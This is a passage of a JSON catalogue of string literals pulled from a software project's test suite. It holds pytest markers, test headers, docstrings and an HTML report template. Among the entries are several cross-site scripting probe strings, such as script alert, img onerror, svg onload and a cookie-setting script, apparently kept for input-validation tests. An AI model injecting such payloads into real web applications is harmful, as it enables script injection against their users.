          "value": ": Custom runner without ACT comment",
          "category": "test_literals",
          "locations": []
        },
        ": Implement": {
          "value": ": Implement",
          "category": "test_literals",
          "locations": []
        },
        ": MISSING - No API key": {
          "value": ": MISSING - No API key",
          "category": "test_literals",
          "locations": []
        },
        ": No tests run": {
          "value": ": No tests run",
          "category": "test_literals",
          "locations": []
        },
        ": OK - API key configured (from": {
          "value": ": OK - API key configured (from",
          "category": "test_literals",
          "locations": []
        },
        ": expected": {
          "value": ": expected",
          "category": "test_literals",
          "locations": []
        },
        "://": {
          "value": "://",
          "category": "test_literals",
          "locations": []
        },
        "://***@": {
          "value": "://***@",
          "category": "test_literals",
          "locations": []
        },
        "::": {
          "value": "::",
          "category": "test_literals",
          "locations": []
        },
        "<!DOCTYPE html>\n<html>\n<head>\n    <title>Real Service Test Report</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }\n        h1 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }\n        h2 { color: #555; margin-top: 30px; }\n        .metric-card { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #007bff; }\n        .success { color: #28a745; font-weight: bold; }\n        .failure { color: #dc3545; font-weight: bold; }\n        .warning { color: #ffc107; }\n        table { width: 100%; border-collapse: collapse; margin: 15px 0; }\n        th { background: #007bff; color: white; padding: 10px; text-align: left; }\n        td { padding: 10px; border-bottom: 1px solid #ddd; }\n        tr:hover { background: #f5f5f5; }\n        .chart { margin: 20px 0; }\n        .progress-bar { width: 100%; height: 30px; background: #e9ecef; border-radius: 5px; overflow: hidden; }\n        .progress-fill { height: 100%; background: linear-gradient(90deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }\n    </style>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Real Service Test Report</h1>": {
          "value": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Real Service Test Report</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }\n        h1 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }\n        h2 { color: #555; margin-top: 30px; }\n        .metric-card { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #007bff; }\n        .success { color: #28a745; font-weight: bold; }\n        .failure { color: #dc3545; font-weight: bold; }\n        .warning { color: #ffc107; }\n        table { width: 100%; border-collapse: collapse; margin: 15px 0; }\n        th { background: #007bff; color: white; padding: 10px; text-align: left; }\n        td { padding: 10px; border-bottom: 1px solid #ddd; }\n        tr:hover { background: #f5f5f5; }\n        .chart { margin: 20px 0; }\n        .progress-bar { width: 100%; height: 30px; background: #e9ecef; border-radius: 5px; overflow: hidden; }\n        .progress-fill { height: 100%; background: linear-gradient(90deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }\n    </style>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Real Service Test Report</h1>",
          "category": "test_literals",
          "locations": []
        },
        "</div></body></html>": {
          "value": "</div></body></html>",
          "category": "test_literals",
          "locations": []
        },
        "<30": {
          "value": "<30",
          "category": "test_literals",
          "locations": []
        },
        "<iframe src=javascript:alert('XSS')></iframe>": {
          "value": "<iframe src=javascript:alert('XSS')></iframe>",
          "category": "test_literals",
          "locations": []
        },
        "<img src=x onerror=alert('XSS')>": {
          "value": "<img src=x onerror=alert('XSS')>",
          "category": "test_literals",
          "locations": []
        },
        "<script>": {
          "value": "<script>",
          "category": "test_literals",
          "locations": []
        },
        "<script>alert('XSS')</script>": {
          "value": "<script>alert('XSS')</script>",
          "category": "test_literals",
          "locations": []
        },
        "<script>document.cookie='admin=true'</script>": {
          "value": "<script>document.cookie='admin=true'</script>",
          "category": "test_literals",
          "locations": []
        },
        "<svg onload=alert('XSS')>": {
          "value": "<svg onload=alert('XSS')>",
          "category": "test_literals",
          "locations": []
        },
        "=": {
          "value": "=",
          "category": "test_literals",
          "locations": []
        },
        "=== AUTHENTICATION TESTS ===": {
          "value": "=== AUTHENTICATION TESTS ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Agent Initialization Tests ===": {
          "value": "=== Agent Initialization Tests ===",
          "category": "test_literals",
          "locations": []
        },
        "=== BASIC FUNCTIONALITY TESTS ===": {
          "value": "=== BASIC FUNCTIONALITY TESTS ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Checking PostgreSQL Availability ===": {
          "value": "=== Checking PostgreSQL Availability ===",
          "category": "test_literals",
          "locations": []
        },
        "=== L3 Test File Standardization ===": {
          "value": "=== L3 Test File Standardization ===",
          "category": "test_literals",
          "locations": []
        },
        "=== OUTPUT FORMAT TESTS ===": {
          "value": "=== OUTPUT FORMAT TESTS ===",
          "category": "test_literals",
          "locations": []
        },
        "=== REPOSITORY HANDLING TESTS ===": {
          "value": "=== REPOSITORY HANDLING TESTS ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Summary ===": {
          "value": "=== Summary ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Test Results ===": {
          "value": "=== Test Results ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Testing Auth Client Environment Detection ===": {
          "value": "=== Testing Auth Client Environment Detection ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Testing Auth Service Database Connection ===": {
          "value": "=== Testing Auth Service Database Connection ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Testing Backend Service Database Connection ===": {
          "value": "=== Testing Backend Service Database Connection ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Testing Cloud SQL Connector Availability ===": {
          "value": "=== Testing Cloud SQL Connector Availability ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Testing Middleware Environment Defaults ===": {
          "value": "=== Testing Middleware Environment Defaults ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Testing OAuth Config Fallback ===": {
          "value": "=== Testing OAuth Config Fallback ===",
          "category": "test_literals",
          "locations": []
        },
        "=== Testing Schema Defaults ===": {
          "value": "=== Testing Schema Defaults ===",
          "category": "test_literals",
          "locations": []
        },
        ">": {
          "value": ">",
          "category": "test_literals",
          "locations": []
        },
        "?": {
          "value": "?",
          "category": "test_literals",
          "locations": []
        },
        "@": {
          "value": "@",
          "category": "test_literals",
          "locations": []
        },
        "@abstractmethod": {
          "value": "@abstractmethod",
          "category": "test_literals",
          "locations": []
        },
        "@domain.com": {
          "value": "@domain.com",
          "category": "test_literals",
          "locations": []
        },
        "@example.com": {
          "value": "@example.com",
          "category": "test_literals",
          "locations": []
        },
        "@localhost:": {
          "value": "@localhost:",
          "category": "test_literals",
          "locations": []
        },
        "@patch": {
          "value": "@patch",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.": {
          "value": "@pytest.",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.": {
          "value": "@pytest.mark.",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.e2e": {
          "value": "@pytest.mark.e2e",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.integration": {
          "value": "@pytest.mark.integration",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.mock_only": {
          "value": "@pytest.mark.mock_only",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.real_clickhouse": {
          "value": "@pytest.mark.real_clickhouse",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.real_database": {
          "value": "@pytest.mark.real_database",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.real_llm": {
          "value": "@pytest.mark.real_llm",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.real_redis": {
          "value": "@pytest.mark.real_redis",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.real_services": {
          "value": "@pytest.mark.real_services",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.skip": {
          "value": "@pytest.mark.skip",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.skipif(\n    os.environ.get(\"ENABLE_REAL_LLM_TESTING\") != \"true\",\n    reason=\"Real LLM tests disabled. Set ENABLE_REAL_LLM_TESTING=true to run\"\n)": {
          "value": "@pytest.mark.skipif(\n    os.environ.get(\"ENABLE_REAL_LLM_TESTING\") != \"true\",\n    reason=\"Real LLM tests disabled. Set ENABLE_REAL_LLM_TESTING=true to run\"\n)",
          "category": "test_literals",
          "locations": []
        },
        "@pytest.mark.unit": {
          "value": "@pytest.mark.unit",
          "category": "test_literals",
          "locations": []
        },
        "@pytest\\.fixture.*?\\ndef\\s+(\\w+)": {
          "value": "@pytest\\.fixture.*?\\ndef\\s+(\\w+)",
          "category": "test_literals",
          "locations": []
        },
        "@skip": {
          "value": "@skip",
          "category": "test_literals",
          "locations": []
        },
        "A": {
          "value": "A",
          "category": "test_literals",
          "locations": []
        },
        "ABC": {
          "value": "ABC",
          "category": "test_literals",
          "locations": []
        },
        "ACCESS_TOKEN_EXPIRE_MINUTES": {
          "value": "ACCESS_TOKEN_EXPIRE_MINUTES",
          "category": "test_literals",
          "locations": []
        },
        "ACCOUNT_LOCKOUT_DURATION": {
          "value": "ACCOUNT_LOCKOUT_DURATION",
          "category": "test_literals",
          "locations": []
        },
        "ACT": {
          "value": "ACT",
          "category": "test_literals",
          "locations": []
        },
        "ACT: ${{ env.ACT }}": {
          "value": "ACT: ${{ env.ACT }}",
          "category": "test_literals",
          "locations": []
        },
        "ACTION REQUIRED": {
          "value": "ACTION REQUIRED",
          "category": "test_literals",
          "locations": []
        },
        "ACTUALLY": {
          "value": "ACTUALLY",
          "category": "test_literals",
          "locations": []
        },
        "AFTER: Split into multiple focused functions (each ≤8 lines)\n        \n        def test_user_creation():\n            user_data = create_user_data()\n            user = create_user(user_data)\n            assert user.email == user_data[\"email\"]\n            assert user.id is not None\n        \n        def test_user_authentication():\n            user = create_test_user()\n            token = authenticate_user(user.email, \"password\")\n            assert token is not None\n            assert isinstance(token, str)\n        \n        def test_user_permissions():\n            user = create_test_user()\n            permissions = get_user_permissions(user)\n            assert \"read\" in permissions\n            assert len(permissions) > 0\n        \n        def test_user_profile_update():\n            user = create_test_user()\n            updated_data = {\"name\": \"Updated Name\"}\n            update_user_profile(user.id, updated_data)\n            assert get_user(user.id).name == \"Updated Name\"\n        \n        def test_user_deletion():\n            user = create_test_user()\n            delete_user(user.id)\n            assert get_user(user.id) is None": {
          "value": "AFTER: Split into multiple focused functions (each ≤8 lines)\n        \n        def test_user_creation():\n            user_data = create_user_data()\n            user = create_user(user_data)\n            assert user.email == user_data[\"email\"]\n            assert user.id is not None\n        \n        def test_user_authentication():\n            user = create_test_user()\n            token = authenticate_user(user.email, \"password\")\n            assert token is not None\n            assert isinstance(token, str)\n        \n        def test_user_permissions():\n            user = create_test_user()\n            permissions = get_user_permissions(user)\n            assert \"read\" in permissions\n            assert len(permissions) > 0\n        \n        def test_user_profile_update():\n            user = create_test_user()\n            updated_data = {\"name\": \"Updated Name\"}\n            update_user_profile(user.id, updated_data)\n            assert get_user(user.id).name == \"Updated Name\"\n        \n        def test_user_deletion():\n            user = create_test_user()\n            delete_user(user.id)\n            assert get_user(user.id) is None",
          "category": "test_literals",
          "locations": []
        },
        "ALL TESTS PASSED": {
          "value": "ALL TESTS PASSED",
          "category": "test_literals",
          "locations": []
        },
        "ALLOWED conftest.py files (service-level):": {
          "value": "ALLOWED conftest.py files (service-level):",
          "category": "test_literals",
          "locations": []
        },
        "ALLOWED_HOSTS": {
          "value": "ALLOWED_HOSTS",
          "category": "test_literals",
          "locations": []
        },
        "ANTHROPIC_API_KEY": {
          "value": "ANTHROPIC_API_KEY",
          "category": "test_literals",
          "locations": []
        },
        "API Documentation": {
          "value": "API Documentation",
          "category": "test_literals",
          "locations": []
        },
        "API URL not found": {
          "value": "API URL not found",
          "category": "test_literals",
          "locations": []
        },
        "API docs are accessible": {
          "value": "API docs are accessible",
          "category": "test_literals",
          "locations": []
        },
        "API docs check failed:": {
          "value": "API docs check failed:",
          "category": "test_literals",
          "locations": []
        },
        "API docs returned status": {
          "value": "API docs returned status",
          "category": "test_literals",
          "locations": []
        },
        "API key configured": {
          "value": "API key configured",
          "category": "test_literals",
          "locations": []
        },
        "API port": {
          "value": "API port",
          "category": "test_literals",
          "locations": []
        },
        "API_BASE_URL": {
          "value": "API_BASE_URL",
          "category": "test_literals",
          "locations": []
        },
        "AST analysis failed for": {
          "value": "AST analysis failed for",
          "category": "test_literals",
          "locations": []
        },
        "AUTH_BASE_URL": {
          "value": "AUTH_BASE_URL",
          "category": "test_literals",
          "locations": []
        },
        "AUTH_FAST_TEST_MODE": {
          "value": "AUTH_FAST_TEST_MODE",
          "category": "test_literals",
          "locations": []
        },
        "AUTH_SERVICE_URL": {
          "value": "AUTH_SERVICE_URL",
          "category": "test_literals",
          "locations": []
        },
        "AUTOCOMMIT": {
          "value": "AUTOCOMMIT",
          "category": "test_literals",
          "locations": []
        },
        "AUTOMATED SPLITTING SUGGESTIONS (": {
          "value": "AUTOMATED SPLITTING SUGGESTIONS (",
          "category": "test_literals",
          "locations": []
        },
        "AVAILABLE TEST LEVELS": {
          "value": "AVAILABLE TEST LEVELS",
          "category": "test_literals",
          "locations": []
        },
        "Accept": {
          "value": "Accept",
          "category": "test_literals",
          "locations": []
        },
        "Access token duration:": {
          "value": "Access token duration:",
          "category": "test_literals",
          "locations": []
        },
        "Access-Control-Allow-Origin": {
          "value": "Access-Control-Allow-Origin",
          "category": "test_literals",
          "locations": []
        },
        "Access-Control-Request-Method": {
          "value": "Access-Control-Request-Method",
          "category": "test_literals",
          "locations": []
        },
        "Action Required:": {
          "value": "Action Required:",
          "category": "test_literals",
          "locations": []
        },
        "Action:": {
          "value": "Action:",
          "category": "test_literals",
          "locations": []
        },
        "Active connections:": {
          "value": "Active connections:",
          "category": "test_literals",
          "locations": []
        },
        "Actual file generation not yet implemented": {
          "value": "Actual file generation not yet implemented",
          "category": "test_literals",
          "locations": []
        },
        "Actual fixes require force_unsafe=True. Switching to dry-run mode.": {
          "value": "Actual fixes require force_unsafe=True. Switching to dry-run mode.",
          "category": "test_literals",
          "locations": []
        },
        "Add": {
          "value": "Add",
          "category": "test_literals",
          "locations": []
        },
        "Add Jest coverage arguments": {
          "value": "Add Jest coverage arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add Jest option arguments": {
          "value": "Add Jest option arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add Jest option arguments to parser": {
          "value": "Add Jest option arguments to parser",
          "category": "test_literals",
          "locations": []
        },
        "Add a violation to the list": {
          "value": "Add a violation to the list",
          "category": "test_literals",
          "locations": []
        },
        "Add additional check arguments to parser": {
          "value": "Add additional check arguments to parser",
          "category": "test_literals",
          "locations": []
        },
        "Add additional test environment variables": {
          "value": "Add additional test environment variables",
          "category": "test_literals",
          "locations": []
        },
        "Add assertions to": {
          "value": "Add assertions to",
          "category": "test_literals",
          "locations": []
        },
        "Add bad test detection plugin arguments": {
          "value": "Add bad test detection plugin arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add caching layer": {
          "value": "Add caching layer",
          "category": "test_literals",
          "locations": []
        },
        "Add circuit breakers": {
          "value": "Add circuit breakers",
          "category": "test_literals",
          "locations": []
        },
        "Add common pytest options": {
          "value": "Add common pytest options",
          "category": "test_literals",
          "locations": []
        },
        "Add conditional skip for real service tests": {
          "value": "Add conditional skip for real service tests",
          "category": "test_literals",
          "locations": []
        },
        "Add coverage arguments": {
          "value": "Add coverage arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add coverage arguments to backend parser": {
          "value": "Add coverage arguments to backend parser",
          "category": "test_literals",
          "locations": []
        },
        "Add coverage options if requested": {
          "value": "Add coverage options if requested",
          "category": "test_literals",
          "locations": []
        },
        "Add environment arguments to backend parser": {
          "value": "Add environment arguments to backend parser",
          "category": "test_literals",
          "locations": []
        },
        "Add environment arguments to parser": {
          "value": "Add environment arguments to parser",
          "category": "test_literals",
          "locations": []
        },
        "Add execution arguments to backend parser": {
          "value": "Add execution arguments to backend parser",
          "category": "test_literals",
          "locations": []
        },
        "Add execution control arguments": {
          "value": "Add execution control arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add fail fast arguments": {
          "value": "Add fail fast arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add failed first arguments": {
          "value": "Add failed first arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add failures to priority list if category is critical/high": {
          "value": "Add failures to priority list if category is critical/high",
          "category": "test_literals",
          "locations": []
        },
        "Add filter arguments (markers and keywords)": {
          "value": "Add filter arguments (markers and keywords)",
          "category": "test_literals",
          "locations": []
        },
        "Add import statement to file": {
          "value": "Add import statement to file",
          "category": "test_literals",
          "locations": []
        },
        "Add isolation arguments to parser": {
          "value": "Add isolation arguments to parser",
          "category": "test_literals",
          "locations": []
        },
        "Add isolation-specific Jest arguments": {
          "value": "Add isolation-specific Jest arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add markers to a test class": {
          "value": "Add markers to a test class",
          "category": "test_literals",
          "locations": []
        },
        "Add markers to a test function": {
          "value": "Add markers to a test function",
          "category": "test_literals",
          "locations": []
        },
        "Add missing function to a module": {
          "value": "Add missing function to a module",
          "category": "test_literals",
          "locations": []
        },
        "Add mock user for testing": {
          "value": "Add mock user for testing",
          "category": "test_literals",
          "locations": []
        },
        "Add more end-to-end tests (current:": {
          "value": "Add more end-to-end tests (current:",
          "category": "test_literals",
          "locations": []
        },
        "Add output arguments to backend parser": {
          "value": "Add output arguments to backend parser",
          "category": "test_literals",
          "locations": []
        },
        "Add output format arguments": {
          "value": "Add output format arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add parallel execution arguments": {
          "value": "Add parallel execution arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add pytest configuration file path": {
          "value": "Add pytest configuration file path",
          "category": "test_literals",
          "locations": []
        },
        "Add pytest markers to test files": {
          "value": "Add pytest markers to test files",
          "category": "test_literals",
          "locations": []
        },
        "Add realistic noise to degraded metrics": {
          "value": "Add realistic noise to degraded metrics",
          "category": "test_literals",
          "locations": []
        },
        "Add security checks, request size limits": {
          "value": "Add security checks, request size limits",
          "category": "test_literals",
          "locations": []
        },
        "Add test filters based on mode": {
          "value": "Add test filters based on mode",
          "category": "test_literals",
          "locations": []
        },
        "Add test paths based on category or specific paths": {
          "value": "Add test paths based on category or specific paths",
          "category": "test_literals",
          "locations": []
        },
        "Add test patterns for selected category": {
          "value": "Add test patterns for selected category",
          "category": "test_literals",
          "locations": []
        },
        "Add test selection arguments": {
          "value": "Add test selection arguments",
          "category": "test_literals",
          "locations": []
        },
        "Add test selection arguments to backend parser": {
          "value": "Add test selection arguments to backend parser",
          "category": "test_literals",
          "locations": []
        },
        "Add test selection arguments to parser": {
          "value": "Add test selection arguments to parser",
          "category": "test_literals",
          "locations": []
        },
        "Add test type arguments to parser": {
          "value": "Add test type arguments to parser",
          "category": "test_literals",
          "locations": []
        },
        "Add verbosity arguments": {
          "value": "Add verbosity arguments",
          "category": "test_literals",
          "locations": []
        },
        "Added": {
          "value": "Added",
          "category": "test_literals",
          "locations": []
        },
        "Added missing typing imports": {
          "value": "Added missing typing imports",
          "category": "test_literals",
          "locations": []
        },
        "Added mock imports": {
          "value": "Added mock imports",
          "category": "test_literals",
          "locations": []
        },
        "Adding pytest markers to test files...": {
          "value": "Adding pytest markers to test files...",
          "category": "test_literals",
          "locations": []
        },
        "Additional arguments to pass to Jest": {
          "value": "Additional arguments to pass to Jest",
          "category": "test_literals",
          "locations": []
        },
        "Address critical bottlenecks immediately": {
          "value": "Address critical bottlenecks immediately",
          "category": "test_literals",
          "locations": []
        },
        "Adds appropriate pytest markers to test files": {
          "value": "Adds appropriate pytest markers to test files",
          "category": "test_literals",
          "locations": []
        },
        "After examining the performance metrics, here are my recommendations:": {
          "value": "After examining the performance metrics, here are my recommendations:",
          "category": "test_literals",
          "locations": []
        },
        "Aggregate coverage metrics by component and tier": {
          "value": "Aggregate coverage metrics by component and tier",
          "category": "test_literals",
          "locations": []
        },
        "Aggregating coverage...": {
          "value": "Aggregating coverage...",
          "category": "test_literals",
          "locations": []
        },
        "Align Test Imports and Configuration Script\nFixes all test-related import issues and configuration misalignments.": {
          "value": "Align Test Imports and Configuration Script\nFixes all test-related import issues and configuration misalignments.",
          "category": "test_literals",
          "locations": []
        },
        "Aligns test imports and fixes configuration issues.": {
          "value": "Aligns test imports and fixes configuration issues.",
          "category": "test_literals",
          "locations": []
        },
        "All critical imports successful!": {
          "value": "All critical imports successful!",
          "category": "test_literals",
          "locations": []
        },
        "All syntax errors fixed!": {
          "value": "All syntax errors fixed!",
          "category": "test_literals",
          "locations": []
        },
        "All tests comply with requirements!": {
          "value": "All tests comply with requirements!",
          "category": "test_literals",
          "locations": []
        },
        "All tests passed! The script is working correctly.": {
          "value": "All tests passed! The script is working correctly.",
          "category": "test_literals",
          "locations": []
        },
        "Allowed locations:": {
          "value": "Allowed locations:",
          "category": "test_literals",
          "locations": []
        },
        "Already in correct order": {
          "value": "Already in correct order",
          "category": "test_literals",
          "locations": []
        },
        "Analysis complete. 3 optimization opportunities identified.": {
          "value": "Analysis complete. 3 optimization opportunities identified.",
          "category": "test_literals",
          "locations": []
        },
        "Analysis complete. Suggested creating": {
          "value": "Analysis complete. Suggested creating",
          "category": "test_literals",
          "locations": []
        },
        "Analysis failed:": {
          "value": "Analysis failed:",
          "category": "test_literals",
          "locations": []
        },
        "Analysis for": {
          "value": "Analysis for",
          "category": "test_literals",
          "locations": []
        },
        "Analysis results for a test file": {
          "value": "Analysis results for a test file",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a class node and extract its methods.": {
          "value": "Analyze a class node and extract its methods.",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a function for metrics": {
          "value": "Analyze a function for metrics",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a function node and extract metadata.": {
          "value": "Analyze a function node and extract metadata.",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a single function": {
          "value": "Analyze a single function",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a single test file for size violations": {
          "value": "Analyze a single test file for size violations",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a test class": {
          "value": "Analyze a test class",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a test failure and categorize it": {
          "value": "Analyze a test failure and categorize it",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a test file and extract its structure.": {
          "value": "Analyze a test file and extract its structure.",
          "category": "test_literals",
          "locations": []
        },
        "Analyze a test file and suggest optimal splitting strategies": {
          "value": "Analyze a test file and suggest optimal splitting strategies",
          "category": "test_literals",
          "locations": []
        },
        "Analyze current test coverage": {
          "value": "Analyze current test coverage",
          "category": "test_literals",
          "locations": []
        },
        "Analyze dependencies between components": {
          "value": "Analyze dependencies between components",
          "category": "test_literals",
          "locations": []
        },
        "Analyze each service's metrics for bottlenecks": {
          "value": "Analyze each service's metrics for bottlenecks",
          "category": "test_literals",
          "locations": []
        },
        "Analyze file for splitting": {
          "value": "Analyze file for splitting",
          "category": "test_literals",
          "locations": []
        },
        "Analyze potential cascading impact of bottlenecks": {
          "value": "Analyze potential cascading impact of bottlenecks",
          "category": "test_literals",
          "locations": []
        },
        "Analyze similarities between all test pairs.": {
          "value": "Analyze similarities between all test pairs.",
          "category": "test_literals",
          "locations": []
        },
        "Analyze specific import errors in a file.": {
          "value": "Analyze specific import errors in a file.",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test failure and return analysis": {
          "value": "Analyze test failure and return analysis",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test failures and categorize them": {
          "value": "Analyze test failures and categorize them",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test failures and determine fix strategy": {
          "value": "Analyze test failures and determine fix strategy",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test file quality and return list of issues": {
          "value": "Analyze test file quality and return list of issues",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test organization structure": {
          "value": "Analyze test organization structure",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test output and extract failure information": {
          "value": "Analyze test output and extract failure information",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test reports in time range.": {
          "value": "Analyze test reports in time range.",
          "category": "test_literals",
          "locations": []
        },
        "Analyze test size violations and generate improvement suggestions": {
          "value": "Analyze test size violations and generate improvement suggestions",
          "category": "test_literals",
          "locations": []
        },
        "Analyze the structure of a test file": {
          "value": "Analyze the structure of a test file",
          "category": "test_literals",
          "locations": []
        },
        "Analyze violations and suggest fixes\n        \n        Args:\n            violations_by_file: Dictionary of files with violations\n            dry_run: If True, only simulate changes (SAFE, default)\n            max_files: Maximum number of files to analyze\n            force_unsafe: Required to be True for actual modifications (DANGEROUS)\n        \n        Returns:\n            List of suggested or created files": {
          "value": "Analyze violations and suggest fixes\n        \n        Args:\n            violations_by_file: Dictionary of files with violations\n            dry_run: If True, only simulate changes (SAFE, default)\n            max_files: Maximum number of files to analyze\n            force_unsafe: Required to be True for actual modifications (DANGEROUS)\n        \n        Returns:\n            List of suggested or created files",
          "category": "test_literals",
          "locations": []
        },
        "Analyzes test files and identifies size violations and splitting opportunities.": {
          "value": "Analyzes test files and identifies size violations and splitting opportunities.",
          "category": "test_literals",
          "locations": []
        },
        "Analyzes test files for overlap and similarity.": {
          "value": "Analyzes test files for overlap and similarity.",
          "category": "test_literals",
          "locations": []
        },
        "Analyzes test files for violations and structure": {
          "value": "Analyzes test files for violations and structure",
          "category": "test_literals",
          "locations": []
        },
        "Analyzes test reports for team updates.": {
          "value": "Analyzes test reports for team updates.",
          "category": "test_literals",
          "locations": []
        },
        "Analyzing": {
          "value": "Analyzing",
          "category": "test_literals",
          "locations": []
        },
        "Analyzing and suggesting fixes for": {
          "value": "Analyzing and suggesting fixes for",
          "category": "test_literals",
          "locations": []
        },
        "Analyzing large test file:": {
          "value": "Analyzing large test file:",
          "category": "test_literals",
          "locations": []
        },
        "Analyzing test pairs...": {
          "value": "Analyzing test pairs...",
          "category": "test_literals",
          "locations": []
        },
        "Analyzing:": {
          "value": "Analyzing:",
          "category": "test_literals",
          "locations": []
        },
        "Anti-regression hook to prevent conftest.py violations.\nEnsures conftest.py files only exist at service-level directories.": {
          "value": "Anti-regression hook to prevent conftest.py violations.\nEnsures conftest.py files only exist at service-level directories.",
          "category": "test_literals",
          "locations": []
        },
        "Apply additional common fixes to file content.": {
          "value": "Apply additional common fixes to file content.",
          "category": "test_literals",
          "locations": []
        },
        "Apply degradation to base metrics": {
          "value": "Apply degradation to base metrics",
          "category": "test_literals",
          "locations": []
        },
        "Apply degradation to specific metric type": {
          "value": "Apply degradation to specific metric type",
          "category": "test_literals",
          "locations": []
        },
        "Apply environment variables to os.environ": {
          "value": "Apply environment variables to os.environ",
          "category": "test_literals",
          "locations": []
        },
        "Apply fix based on analysis strategy": {
          "value": "Apply fix based on analysis strategy",
          "category": "test_literals",
          "locations": []
        },
        "Apply import error fix": {
          "value": "Apply import error fix",
          "category": "test_literals",
          "locations": []
        },
        "Apply replacement patterns to content": {
          "value": "Apply replacement patterns to content",
          "category": "test_literals",
          "locations": []
        },
        "Apply seasonal adjustments to traffic": {
          "value": "Apply seasonal adjustments to traffic",
          "category": "test_literals",
          "locations": []
        },
        "Apply settings to environment variables": {
          "value": "Apply settings to environment variables",
          "category": "test_literals",
          "locations": []
        },
        "Apply standard test environment when not using isolation": {
          "value": "Apply standard test environment when not using isolation",
          "category": "test_literals",
          "locations": []
        },
        "Apply test patterns to Jest arguments": {
          "value": "Apply test patterns to Jest arguments",
          "category": "test_literals",
          "locations": []
        },
        "Are you ABSOLUTELY SURE you want to proceed? Type 'YES I UNDERSTAND THE RISKS':": {
          "value": "Are you ABSOLUTELY SURE you want to proceed? Type 'YES I UNDERSTAND THE RISKS':",
          "category": "test_literals",
          "locations": []
        },
        "Assert JWT token claims are valid": {
          "value": "Assert JWT token claims are valid",
          "category": "test_literals",
          "locations": []
        },
        "Assert JWT token is valid": {
          "value": "Assert JWT token is valid",
          "category": "test_literals",
          "locations": []
        },
        "Assert Redis key was deleted": {
          "value": "Assert Redis key was deleted",
          "category": "test_literals",
          "locations": []
        },
        "Assert Redis key was set": {
          "value": "Assert Redis key was set",
          "category": "test_literals",
          "locations": []
        },
        "Assert login response has required fields": {
          "value": "Assert login response has required fields",
          "category": "test_literals",
          "locations": []
        },
        "Assert session data is valid": {
          "value": "Assert session data is valid",
          "category": "test_literals",
          "locations": []
        },
        "Assert session does not exist in database": {
          "value": "Assert session does not exist in database",
          "category": "test_literals",
          "locations": []
        },
        "Assert session exists in database": {
          "value": "Assert session exists in database",
          "category": "test_literals",
          "locations": []
        },
        "Assert token contains expected claims": {
          "value": "Assert token contains expected claims",
          "category": "test_literals",
          "locations": []
        },
        "Assert token has correct JWT structure": {
          "value": "Assert token has correct JWT structure",
          "category": "test_literals",
          "locations": []
        },
        "Assert user data is valid": {
          "value": "Assert user data is valid",
          "category": "test_literals",
          "locations": []
        },
        "Assert user does not exist in database": {
          "value": "Assert user does not exist in database",
          "category": "test_literals",
          "locations": []
        },
        "Assert user exists in database with expected data": {
          "value": "Assert user exists in database with expected data",
          "category": "test_literals",
          "locations": []
        },
        "AssertionError": {
          "value": "AssertionError",
          "category": "test_literals",
          "locations": []
        },
        "Assess quality of existing tests": {
          "value": "Assess quality of existing tests",
